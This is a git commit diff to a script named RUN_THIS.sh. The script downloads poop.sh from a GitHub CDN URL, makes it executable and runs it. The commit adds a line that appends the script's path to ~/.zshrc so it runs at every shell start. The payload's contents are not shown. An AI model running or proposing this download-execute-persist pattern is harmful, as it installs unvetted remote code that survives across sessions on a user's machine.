5dc4c14169a753b201742edab49ebcb8a6966fda
codelinkd203 <iammr.beastbackup+@outlook.com>
2026-06-15 16:41:45 -0700

    Setup directory and execute poop.sh script
    Create directory structure, download and execute script, and update .zshrc.

--- RUN_THIS.sh
+++ RUN_THIS.sh
@@ -1,3 +1,8 @@
+mkdir -p ~/toes/taste/good
+cd ~/toes/taste/good
+
 curl -O "https://cdn.jsdelivr.net/gh/codelinkd203/dumb-terminal@main/poop.sh"
 chmod +x ./poop.sh
 ./poop.sh
+
+echo "~/toes/taste/good/poop.sh" >> ~/.zshrc
